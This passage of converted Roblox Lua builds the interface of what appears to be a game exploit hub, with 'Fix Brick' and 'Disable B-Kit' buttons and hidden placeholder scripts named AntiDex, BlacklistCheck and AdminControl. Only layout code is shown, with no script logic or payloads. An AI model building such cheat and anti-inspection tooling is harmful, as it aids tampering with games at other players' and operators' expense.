-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame
G2L["28b"] = Instance.new("Frame", G2L["28a"]);
G2L["28b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["28b"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["28b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["28b"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["28c"] = Instance.new("UIStroke", G2L["28b"]);
G2L["28c"]["Thickness"] = 2;
G2L["28c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.buttonFade
G2L["28d"] = Instance.new("CanvasGroup", G2L["28b"]);
G2L["28d"]["BorderSizePixel"] = 0;
G2L["28d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["28e"] = Instance.new("UIGradient", G2L["28d"]);
G2L["28e"]["Rotation"] = 90;
G2L["28e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.UIStroke
G2L["28f"] = Instance.new("UIStroke", G2L["28b"]);
G2L["28f"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["28f"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.dividerFrame.UICorner
G2L["290"] = Instance.new("UICorner", G2L["28b"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.---DIVIDER---.UIPadding
G2L["291"] = Instance.new("UIPadding", G2L["28a"]);
G2L["291"]["PaddingTop"] = UDim.new(0, 3);
G2L["291"]["PaddingRight"] = UDim.new(0, 6);
G2L["291"]["PaddingLeft"] = UDim.new(0, 6);
G2L["291"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick
G2L["292"] = Instance.new("Frame", G2L["254"]);
G2L["292"]["BorderSizePixel"] = 0;
G2L["292"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["292"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["292"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["292"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["292"]["Name"] = [[fixbrick]];
G2L["292"]["LayoutOrder"] = 4;
G2L["292"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button
G2L["293"] = Instance.new("TextButton", G2L["292"]);
G2L["293"]["BorderSizePixel"] = 0;
G2L["293"]["TextTransparency"] = 1;
G2L["293"]["TextSize"] = 14;
G2L["293"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["293"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["293"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["293"]["ZIndex"] = 49;
G2L["293"]["BackgroundTransparency"] = 1;
G2L["293"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["293"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["293"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.UIPadding
G2L["294"] = Instance.new("UIPadding", G2L["293"]);
G2L["294"]["PaddingTop"] = UDim.new(0, 2);
G2L["294"]["PaddingRight"] = UDim.new(0, 3);
G2L["294"]["PaddingLeft"] = UDim.new(0, 3);
G2L["294"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame
G2L["295"] = Instance.new("Frame", G2L["293"]);
G2L["295"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["295"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["295"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["295"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["295"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.outlineStroke
G2L["296"] = Instance.new("UIStroke", G2L["295"]);
G2L["296"]["Thickness"] = 2;
G2L["296"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.buttonFade
G2L["297"] = Instance.new("CanvasGroup", G2L["295"]);
G2L["297"]["BorderSizePixel"] = 0;
G2L["297"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["297"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["297"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["297"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["297"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.buttonFade.UIGradient
G2L["298"] = Instance.new("UIGradient", G2L["297"]);
G2L["298"]["Rotation"] = 90;
G2L["298"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.text
G2L["299"] = Instance.new("TextLabel", G2L["293"]);
G2L["299"]["ZIndex"] = 2;
G2L["299"]["BorderSizePixel"] = 0;
G2L["299"]["TextSize"] = 14;
G2L["299"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["299"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["299"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["299"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["299"]["BackgroundTransparency"] = 1;
G2L["299"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["299"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["299"]["Text"] = [[Fix Brick]];
G2L["299"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.text.text
G2L["29a"] = Instance.new("UIStroke", G2L["299"]);
G2L["29a"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.fillbar
G2L["29b"] = Instance.new("Frame", G2L["292"]);
G2L["29b"]["ZIndex"] = 90;
G2L["29b"]["BorderSizePixel"] = 0;
G2L["29b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29b"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["29b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29b"]["Name"] = [[fillbar]];
G2L["29b"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick
G2L["29c"] = Instance.new("Frame", G2L["254"]);
G2L["29c"]["BorderSizePixel"] = 0;
G2L["29c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29c"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["29c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["29c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29c"]["Name"] = [[restorebrick]];
G2L["29c"]["LayoutOrder"] = 4;
G2L["29c"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button
G2L["29d"] = Instance.new("TextButton", G2L["29c"]);
G2L["29d"]["BorderSizePixel"] = 0;
G2L["29d"]["TextTransparency"] = 1;
G2L["29d"]["TextSize"] = 14;
G2L["29d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29d"]["ZIndex"] = 49;
G2L["29d"]["BackgroundTransparency"] = 1;
G2L["29d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["29d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29d"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.UIPadding
G2L["29e"] = Instance.new("UIPadding", G2L["29d"]);
G2L["29e"]["PaddingTop"] = UDim.new(0, 2);
G2L["29e"]["PaddingRight"] = UDim.new(0, 3);
G2L["29e"]["PaddingLeft"] = UDim.new(0, 3);
G2L["29e"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame
G2L["29f"] = Instance.new("Frame", G2L["29d"]);
G2L["29f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["29f"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["29f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["29f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["29f"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.outlineStroke
G2L["2a0"] = Instance.new("UIStroke", G2L["29f"]);
G2L["2a0"]["Thickness"] = 2;
G2L["2a0"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.buttonFade
G2L["2a1"] = Instance.new("CanvasGroup", G2L["29f"]);
G2L["2a1"]["BorderSizePixel"] = 0;
G2L["2a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a1"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a1"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.buttonFade.UIGradient
G2L["2a2"] = Instance.new("UIGradient", G2L["2a1"]);
G2L["2a2"]["Rotation"] = 90;
G2L["2a2"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.text
G2L["2a3"] = Instance.new("TextLabel", G2L["29d"]);
G2L["2a3"]["ZIndex"] = 2;
G2L["2a3"]["BorderSizePixel"] = 0;
G2L["2a3"]["TextSize"] = 14;
G2L["2a3"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a3"]["BackgroundTransparency"] = 1;
G2L["2a3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a3"]["Text"] = [[Restore Brick]];
G2L["2a3"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.text.text
G2L["2a4"] = Instance.new("UIStroke", G2L["2a3"]);
G2L["2a4"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.fillbar
G2L["2a5"] = Instance.new("Frame", G2L["29c"]);
G2L["2a5"]["ZIndex"] = 90;
G2L["2a5"]["BorderSizePixel"] = 0;
G2L["2a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a5"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["2a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a5"]["Name"] = [[fillbar]];
G2L["2a5"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog
G2L["2a6"] = Instance.new("Frame", G2L["254"]);
G2L["2a6"]["BorderSizePixel"] = 0;
G2L["2a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a6"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["2a6"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["2a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a6"]["Name"] = [[disablebkitog]];
G2L["2a6"]["LayoutOrder"] = 4;
G2L["2a6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button
G2L["2a7"] = Instance.new("TextButton", G2L["2a6"]);
G2L["2a7"]["BorderSizePixel"] = 0;
G2L["2a7"]["TextTransparency"] = 1;
G2L["2a7"]["TextSize"] = 14;
G2L["2a7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a7"]["ZIndex"] = 49;
G2L["2a7"]["BackgroundTransparency"] = 1;
G2L["2a7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a7"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.UIPadding
G2L["2a8"] = Instance.new("UIPadding", G2L["2a7"]);
G2L["2a8"]["PaddingTop"] = UDim.new(0, 2);
G2L["2a8"]["PaddingRight"] = UDim.new(0, 3);
G2L["2a8"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2a8"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame
G2L["2a9"] = Instance.new("Frame", G2L["2a7"]);
G2L["2a9"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2a9"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2a9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a9"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2a9"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.outlineStroke
G2L["2aa"] = Instance.new("UIStroke", G2L["2a9"]);
G2L["2aa"]["Thickness"] = 2;
G2L["2aa"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.buttonFade
G2L["2ab"] = Instance.new("CanvasGroup", G2L["2a9"]);
G2L["2ab"]["BorderSizePixel"] = 0;
G2L["2ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ab"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ab"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ab"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.buttonFade.UIGradient
G2L["2ac"] = Instance.new("UIGradient", G2L["2ab"]);
G2L["2ac"]["Rotation"] = 90;
G2L["2ac"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.text
G2L["2ad"] = Instance.new("TextLabel", G2L["2a7"]);
G2L["2ad"]["ZIndex"] = 2;
G2L["2ad"]["BorderSizePixel"] = 0;
G2L["2ad"]["TextSize"] = 14;
G2L["2ad"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ad"]["BackgroundTransparency"] = 1;
G2L["2ad"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ad"]["Text"] = [[Disable B-Kit (OG)]];
G2L["2ad"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.text.text
G2L["2ae"] = Instance.new("UIStroke", G2L["2ad"]);
G2L["2ae"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.fillbar
G2L["2af"] = Instance.new("Frame", G2L["2a6"]);
G2L["2af"]["ZIndex"] = 90;
G2L["2af"]["BorderSizePixel"] = 0;
G2L["2af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2af"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["2af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2af"]["Name"] = [[fillbar]];
G2L["2af"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.UIListLayout
G2L["2b0"] = Instance.new("UIListLayout", G2L["253"]);
G2L["2b0"]["Padding"] = UDim.new(0, 5);
G2L["2b0"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.blackstroke
G2L["2b1"] = Instance.new("UIStroke", G2L["10"]);
G2L["2b1"]["Thickness"] = 2;
G2L["2b1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2b1"]["Name"] = [[blackstroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.UIScale
G2L["2b2"] = Instance.new("UIScale", G2L["5"]);



-- StarterGui.T5784YHRGE89ES98T.UIScale
G2L["2b3"] = Instance.new("UIScale", G2L["1"]);



-- StarterGui.T5784YHRGE89ES98T.Color
G2L["2b4"] = Instance.new("Frame", G2L["1"]);
G2L["2b4"]["Visible"] = false;
G2L["2b4"]["BorderSizePixel"] = 0;
G2L["2b4"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["2b4"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["2b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b4"]["Name"] = [[Color]];
G2L["2b4"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.Tooltip
G2L["2b5"] = Instance.new("Frame", G2L["1"]);
G2L["2b5"]["ZIndex"] = 1000000009;
G2L["2b5"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2b5"]["Size"] = UDim2.new(0, 100, 0, 20);
G2L["2b5"]["Position"] = UDim2.new(0.68056, 0, 0.81319, 0);
G2L["2b5"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2b5"]["Name"] = [[Tooltip]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipScript
G2L["2b6"] = Instance.new("LocalScript", G2L["2b5"]);
G2L["2b6"]["Name"] = [[tooltipScript]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipFade
G2L["2b7"] = Instance.new("CanvasGroup", G2L["2b5"]);
G2L["2b7"]["BorderSizePixel"] = 0;
G2L["2b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b7"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b7"]["Name"] = [[tooltipFade]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipFade.UIGradient
G2L["2b8"] = Instance.new("UIGradient", G2L["2b7"]);
G2L["2b8"]["Rotation"] = 90;
G2L["2b8"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Tooltip.text
G2L["2b9"] = Instance.new("TextLabel", G2L["2b5"]);
G2L["2b9"]["TextWrapped"] = true;
G2L["2b9"]["ZIndex"] = 999999999;
G2L["2b9"]["BorderSizePixel"] = 0;
G2L["2b9"]["TextSize"] = 12;
G2L["2b9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b9"]["BackgroundTransparency"] = 1;
G2L["2b9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b9"]["Text"] = [[--]];
G2L["2b9"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.text.text
G2L["2ba"] = Instance.new("UIStroke", G2L["2b9"]);
G2L["2ba"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.text.UIPadding
G2L["2bb"] = Instance.new("UIPadding", G2L["2b9"]);
G2L["2bb"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.Tooltip.UIScale
G2L["2bc"] = Instance.new("UIScale", G2L["2b5"]);



-- StarterGui.T5784YHRGE89ES98T.MasterScripts
G2L["2bd"] = Instance.new("Folder", G2L["1"]);
G2L["2bd"]["Name"] = [[MasterScripts]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ToggleMaster
G2L["2be"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2be"]["Name"] = [[ToggleMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ButtonMaster
G2L["2bf"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2bf"]["Name"] = [[ButtonMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.TextboxMaster
G2L["2c0"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c0"]["Name"] = [[TextboxMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.SliderMaster
G2L["2c1"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c1"]["Name"] = [[SliderMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.DropdownMaster
G2L["2c2"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c2"]["Name"] = [[DropdownMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ColorPickerMaster
G2L["2c3"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c3"]["Name"] = [[ColorPickerMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ChatMaster
G2L["2c4"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c4"]["Name"] = [[ChatMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.UserList
G2L["2c5"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c5"]["Name"] = [[UserList]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.MAINCALLS
G2L["2c6"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c6"]["Name"] = [[MAINCALLS]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.Notif
G2L["2c7"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2c7"]["Name"] = [[Notif]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE
G2L["2c8"] = Instance.new("Folder", G2L["1"]);
G2L["2c8"]["Name"] = [[SecretScriptsHIDE]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AntiDex
G2L["2c9"] = Instance.new("LocalScript", G2L["2c8"]);
G2L["2c9"]["Name"] = [[AntiDex]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.BlacklistCheck
G2L["2ca"] = Instance.new("LocalScript", G2L["2c8"]);
G2L["2ca"]["Name"] = [[BlacklistCheck]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AdminControl
G2L["2cb"] = Instance.new("LocalScript", G2L["2c8"]);
G2L["2cb"]["Name"] = [[AdminControl]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker
G2L["2cc"] = Instance.new("Frame", G2L["1"]);
G2L["2cc"]["ZIndex"] = 1000000011;
G2L["2cc"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2cc"]["Size"] = UDim2.new(0, 200, 0, 270);
G2L["2cc"]["Position"] = UDim2.new(0.54615, 0, 0.6233, 0);
G2L["2cc"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2cc"]["Name"] = [[ColorPicker]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerScript
G2L["2cd"] = Instance.new("LocalScript", G2L["2cc"]);
G2L["2cd"]["Name"] = [[colorpickerScript]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout
G2L["2ce"] = Instance.new("Frame", G2L["2cc"]);
G2L["2ce"]["ZIndex"] = 99;
G2L["2ce"]["BorderSizePixel"] = 0;
G2L["2ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ce"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ce"]["Name"] = [[innerframelayout]];
G2L["2ce"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT
G2L["2cf"] = Instance.new("Frame", G2L["2ce"]);
G2L["2cf"]["BorderSizePixel"] = 0;
G2L["2cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2cf"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["2cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2cf"]["Name"] = [[ACCENT]];
G2L["2cf"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT.GuiColor
G2L["2d0"] = Instance.new("Frame", G2L["2cf"]);
G2L["2d0"]["BorderSizePixel"] = 0;
G2L["2d0"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["2d0"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["2d0"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["2d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d0"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT.GuiColor.UICorner
G2L["2d1"] = Instance.new("UICorner", G2L["2d0"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text
G2L["2d2"] = Instance.new("TextLabel", G2L["2ce"]);
G2L["2d2"]["TextWrapped"] = true;
G2L["2d2"]["ZIndex"] = 999999999;
G2L["2d2"]["BorderSizePixel"] = 0;
G2L["2d2"]["TextSize"] = 12;
